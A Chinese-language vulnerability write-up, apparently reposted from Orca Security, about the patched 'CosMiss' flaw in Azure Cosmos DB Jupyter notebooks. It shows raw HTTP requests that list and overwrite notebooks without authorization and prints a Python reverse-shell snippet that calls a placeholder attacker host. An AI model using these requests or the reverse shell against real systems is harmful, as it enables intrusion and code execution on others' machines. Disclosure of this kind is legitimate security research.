#  CosMiss：Azure Cosmos DB Notebook 远程代码执行漏洞   
枇杷五星加强版  黑伞安全   2023-06-13 18:51  
  
我们最近在 Azure Cosmos DB 上发现了一个非常重要的漏洞，其中 Cosmos DB 笔记本缺少身份验证检查。  
我们将其命名为“CosMiss”。  
简而言之，如果攻击者知道笔记本的“forwardingId”，即笔记本工作区的 UUID，他们将拥有笔记本的全部权限，包括读写访问权限，以及修改笔记本文件系统的能力运行笔记本的容器。  
通过修改容器文件系统（又名临时笔记本托管的专用工作区），我们能够在笔记本容器中获得远程代码执行（RCE）。  
## 关于 CosMiss 漏洞  
- 该漏洞是在 Azure Cosmos DB Jupyter Notebooks 中发现的，这是微软的快速 NoSQL 数据库，广泛用于微软自己的电子商务平台和零售行业，用于存储目录数据和订单处理管道中的事件源。   
  
- Jupyter 笔记本内置于 Azure Cosmos DB 中，开发人员使用它来执行常见任务，例如数据清理、数据探索、数据转换和机器学习。  
在我们的研究过程中，我们发现  
Cosmos DB Jupyter 笔记本中   
缺少身份验证检查。  
  
- 这是特别危险的，因为开发人员使用 Cosmos DB Notebooks 来创建代码，并且通常包含高度敏感的信息，例如代码中嵌入的秘密和私钥。  
  
- “CosMiss”漏洞允许未经身份验证的用户获得对 Azure Cosmos DB 笔记本的读写访问权限、注入代码和覆盖代码——构成远程代码执行 (RCE)。  
  
- 但是，攻击者只有知道笔记本工作区的 UUID（也称为  
  
forwardingId）  
才能利用此漏洞  
。  
据我们所知，获取 forwardingId 的唯一方法是以经过身份验证的用户身份打开 Notebook。  
虽然 forwardingId 没有记录为秘密，因此我们没有任何理由相信用户会这样对待它。  
  
- 2022  
年 10 月 3 日，  
 Orca Security 向微软报告了该漏洞，微软在两天内修复并修补了该漏洞——现在要求每个笔记本会话的请求标头中都有一个授权令牌。  
  
## 什么是 Cosmos DB 笔记本？  
  
Cosmiss 漏洞是在 Cosmos DB Jupyter Notebooks 中发现的。  
Azure Cosmos DB 是一种快速的 NoSQL 数据库。  
Azure Cosmos DB 包括  
Jupyter Notebooks  
，这是一个开源交互式开发人员环境 (IDE)，允许开发人员创建、执行和共享包含实时代码、方程式、可视化和叙述文本的文档。  
由于开发人员使用 Cosmos DB Notebooks 来创建代码，因此它们可能包含高度敏感的信息，例如代码中嵌入的秘密和私钥。   
## 利用 CosMiss 的概念证明  
  
为了演示该漏洞，我们使用 Azure 表 API 和无服务器容量模式创建了一个 Cosmos DB。  
该漏洞还在 Core SQL api（推荐）和预配置吞吐量部署上得到验证。  
  
Cosmos DB Data Explorer blade 中的笔记本功能允许客户使用 Jupyter 功能（在 Python、C# 或其他运行时中）访问和可视化他们的数据。  
此外，客户还可以使用此功能检查来自 Cosmos DB 的数据以及可使用其 API 集成的其他数据源。  
### 1.不需要授权标头  
  
当用户创建新  
Notebooks时，以下端点由 phoenixServiceUrl 创建，  
它生成以下项目：  
```
POST 
/api/controlplane/toolscontainer/cosmosaccounts/subscriptions/[tenant-id]/resourceGroups/Orca-Research/providers/Microsoft.DocumentDB/databaseAccounts/orca-cosmos-dev/containerconnections/multicontainer HTTP/2
Host: tools.cosmos.azure.com
Content-Length: 88
Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
Authorization: Bearer 
eyJ0eXAiOiJKV1QiLdaaaxxWMFRPSSIsImtpZCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGxWMFRPSSJ9.eyJhdWQddaaam5ldC8yMjdkY2ExZC1iMWE1LTQ0MDEtYTVmZi05N2Q5OTMxZWE4YmUvIiwiaWF0IjoxNjY0NzE4NTI3LCJuYmYiOjE2NjQ3MTg1MjcsImV4cCI6MTY2NDcyMzIxOSwiYWNyIjoiMSIsndkbkZ3d1lKQUNNNjJjdmkrbERTVnRpQWIvdEpDOW9HV2VFd2pwWGhsL2x3aStzVzZWWHB5UmV5ZFpwMVgiLCJhdI0N2QtOTc0ZTUzY2JkZjNjIiwiYXBwaWRhY3Icadasdddddab3NtbyIsIm9pZCI6IjNhMzJkNmU1LWEyYzMtNGM5MS1iOTA5LTc0N2YxNjQ2NDg3MSIsInB1aWQiOiIxMDAzMjAwMjM2RUJBODZEIiwicmgiOiIwLkFZSUFIY3A5SXFXeEFVU2xfNWZaa3g2b3ZrWklmM2tBdXRkUHVrUGF3ZmoyTUJPQ0FHay4iLCJzY3AiOiJ1c2VyX2ltcGVyc29uYXRpb24iLCJzdWIiOiJZTElsRzB1anZDaktlSWo5OHozRk94R3ZvTjl2Umx3UFRtczlOa1dfQng0IiwidGlkIjoiMjI3ZGNhMWQtYjFhNS00NDAxLWE1ZmYtOTdkOTkzMWVhOGJlIiwidW5pcXVlX25hbWUiOiJjb3Ntb0BvcmNhc2VjdXJpdHlyZXNlYXJjaC5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJjb3Ntb0BvcmNhc2VjdXJpdHlyZXNlYXJjaC5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJuZ3VDVm1qZFhrS3RUSW5BaG9GbEFBIiwidmVyIjoiMS4wIiwieG1zX3RjZHQiOjE2MTg4MTYwODl9.Gyd3LXwzBG1yj-JfO0PCXOyD0exC7U-MCXwJBdsadcadad3xLIRZ7NqBq5BhE0WXLV2cgziYf-CAT9QT6oy1yIn58RaRdMojlVbhCpxlfFTdnsOXiorzNwTHzcwwvWsM4fbl2vV-RKMO
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: /
Origin: https://cosmos.azure.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://cosmos.azure.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-IL,en;q=0.9,he-IL;q=0.8,he;q=0.7,en-US;q=0.6,pl;q=0.5

{"cosmosEndpoint":"https://orca-cosmos-dev.documents.azure.com:443/","poolId":"default"}

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzqtC666rAOWeiaYHjRV5XbjMkibOn5EJbDdoHX2viaDrXmNfuZaibc2rSkA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzElPZvasWzdkqO9e0fvu3GVRiamIdfnF9DMUWPCHKL7OVegicm92GG3GA/640?wx_fmt=png "")  
  
The response is:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzXJ6feey0HPS6iaPpaLtUynXFjVgJSnaOGsZ4ubkBrHznbpt1Y8bRNUg/640?wx_fmt=png "")  
  
我们可以看到创建了以下项目：  
1. 一个 https://seasia.tools.cosmos.azure.com 端点。  
  
1. 唯一端口（端口范围为 10000-10009，稍后会详细介绍）。  
  
1. 充当会话/笔记本 ID 的唯一值 (   
UUIDv4  
 )，也称为  
forwardingId  
（  
上例中的ab83e033-1670-4bac-a186-32a1c0dddfbc ）。  
  
我们可以看到后端服务器正在发送以下端点：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzzjmWEtQRTTk63wj6XUFCEzqREicj6klHRj1w5H6nT3cjqxDUbUA8XMw/640?wx_fmt=png "")  
  
  
我们目前的forwardingId好像是  
27f180bc-cf93-4c42-b23e-f27a5085da57  
```
```  
  
通过查看我们的笔记本服务器（即 https://seasia.tools.cosmos.azure.com:10007/）发送的各种请求，似乎发送到服务器的所有请求都包含一个  
授权   
标头  
，因为我们从下面的截图可以看出：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzNaXgrnmFwF5QuSRKemYOiaqLEq7dHviaQN0iaSS8RBj2qbpjW0B4ibGSew/640?wx_fmt=png "")  
  
当我们尝试删除授权标头并发送相同的请求时，我们看到  
无需授权标头即可列出同一服务器的不同笔记本。  
  
https://seasia.tools.cosmos.azure.com:10007/api/containergateway/27f180bc-cf93-4c42-b23e-f27a5085da57/api/contents/notebooks  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzQ2H01jqgV3f1LXsKqH93jJaiaicdfnRnC0jVPXR8icOU5MOUiarPtriaQcA/640?wx_fmt=png "")  
  
由于 Cosmos DB 表和 Python 查询是基于 Jupyter 的（+Tornado 服务器），我们可以查看作为平台一部分的各种端点：  
  
<https://github.com/jupyter-server/kernel_gateway/blob/master/kernel_gateway/jupyter_websocket/swagger.json>]（<https://github.com/jupyter-server/kernel_gateway/blob/master/kernel_gateway/ jupyter_websocket/swagger.json>)#36  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzC3XYCM55LRje8N9yzjcLna4hfk6rf4LmIl4iczMsNz36VApC9jcZ2gA/640?wx_fmt=png "")  
  
在查看各种安全定义时，我们可以假设默认情况下当前的安全配置设置不正确，  
因为需要使用授权标头或查询字符串设置授权方法。  
  
考虑到这一点，我们现在可以尝试滥用这种错误配置来操纵各种笔记本和模板。  
### 2.覆盖、删除和注入代码  
  
现在让我们尝试覆盖当前的笔记本数据。  
首先，我们在笔记本中编写一些示例代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzvT5DfFzbZicjYic5meMEB5tic5JXDibnibaic7SWria5KPC1YnVzAwtADjJvg/640?wx_fmt=png "")  
  
然后我们保存它 -  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzhGlp9xltuaic40rglsvvdGcsQkU88ubD3dTjrr1Pia6ibR9YZJpvLgeGg/640?wx_fmt=png "")  
  
我们还可以通过 Burp 查看 Notebook (   
Untitled.ipynb  
 ) –  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzsiafncmksics88VeD2icJSquFSc9uYibgsrvuT7mcoTxQoOls71w6PB5rg/640?wx_fmt=png "")  
  
此外，我们可以从以下端点获取 kernel_id：  
```
```  
  
发送上述请求将为我们提供以下 ID –  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzIdTsXxFr3zQUyj2AYSSgHVQnmEFG2tw0iaDSMbK9prm2cvics6VrvNvw/640?wx_fmt=png "")  
  
现在让我们通过使用以下 JSON 有效负载向笔记本本身发送 PUT 请求来覆盖随机笔记本（请参阅正文）：  
- 源  
参数 ⇒ “print('Hacked')”  
  
- 文本  
参数 ⇒ “print('Hacked')”  
  
  
```
PUT 
/api/containergateway/27f180bc-cf93-4c42-b23e-f27a5085da57/api/contents/notebooks/Untitled.ipynb HTTP/2
Host: [seasia.tools.cosmos.azure.com:1000](<http://seasia.tools.cosmos.azure.com:10005/>)7
Content-Length: 983
Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Origin: [<https://cosmos.azure.com>](<https://cosmos.azure.com/>)
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: [<https://cosmos.azure.com/>](<https://cosmos.azure.com/>)
Accept-Encoding: gzip, deflate
Accept-Language: en-IL,en;q=0.9,he-IL;q=0.8,he;q=0.7,en-US;q=0.6,pl;q=0.5

{"kernel":{"id":null,"name":"python3"},"name":"",
"content": {"cells": [{"cell_type": "code", "execution_count": 1, "id": "47bdbef0-ea14-4960-8789-7983e63312dd", "metadata": {"collapsed": true, "execution": {"iopub.execute_input": "2022-10-02T08:06:27.283Z", "iopub.status.busy": "2022-10-02T08:06:27.277Z", "iopub.status.idle": "2022-10-02T08:06:27.299Z", "shell.execute_reply": "2022-10-02T08:06:27.292Z"}, "jupyter": {"outputs_hidden": false, "source_hidden": false}, "nteract": {"transient": {"deleting": false}}, "trusted": true}, "outputs": [{"name": "stdout", "output_type": "stream", "text": "hacked\\n"}], "source": "print('Hacked!')"}], "metadata": {"language_info": {"file_extension": "ipynb", "mimetype": "application/json", "name": "python", "version": "3.7"}, "nteract": {"version": "dataExplorer 1.0"}}, "nbformat": 4, "nbformat_minor": 5}, "format": "json", "mimetype": null, "size": 993, "writable": true, "path":"notebooks/Untitled.ipynb","type":"notebook"}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzI7QJU6YsD4tDc98RPK73AV29NE0d30aYq0TKjkak8fiaZb8VaUjV6Fw/640?wx_fmt=png "")  
  
我们可以看到，Notebook 中的代码已通过将精心制作的有效载荷直接发送到服务器而被覆盖。  
我们还设法检索任何笔记本并删除代码并将代码注入其中，无论我们是否连接到 Azure，或者只是一个未经身份验证的用户。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZznzes2CSBCR6icwOia7qS3tNfaR9WSFw24T7SFj7T6oMyDsK6yicf30Knw/640?wx_fmt=png "")  
  
在下面的视频中，我们演示了上述概念验证  
  
### 3.远程代码执行（RCE）  
  
通过 Azure UI 加载 Cosmos Data Explorer 时，Explorer 仪表板由以下文件构建：  
```
```  
  
现在，由于我们设法覆盖了  
/home/cosmosuser  
目录中的任何文件，我们可以操作该文件并向其中添加以下行 -  
```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\\"ATTACKER_ID\\",ATTACKER_PORT));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);import pty; pty.spawn(\\"/bin/bash\\")
```  
  
  
这样，当Data Explorer被加载时，整个python代码的这部分也会被执行，并最终给任何远程攻击者一个跨客户端的反向shell。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzQg9QGENFwgMmLJsHTBYe8h6D155tS1WWnH0QmhBw7sqWvpwjib4Olog/640?wx_fmt=png "")  
  
通过发送带有文件原始内容 + RCE 行的 PUT 请求来修改文件：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzzeRjiadzvwbwicOZXGdRAPN5XIF5oPUocIH7UY3SxibDz6LYlaOGFyMFw/640?wx_fmt=png "")  
  
刷新 Data Explorer 页面后，我们应该得到一个反向 shell。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGqnfcqBQyBO8CW5O9LMJlZzbGiatE61LheErRF4XPchXrfh1h68Ju6dC1eVBwiaat10GvoouZiapJpHg/640?wx_fmt=png "")  
  
以下视频演示了此 RCE：  
  
  
  
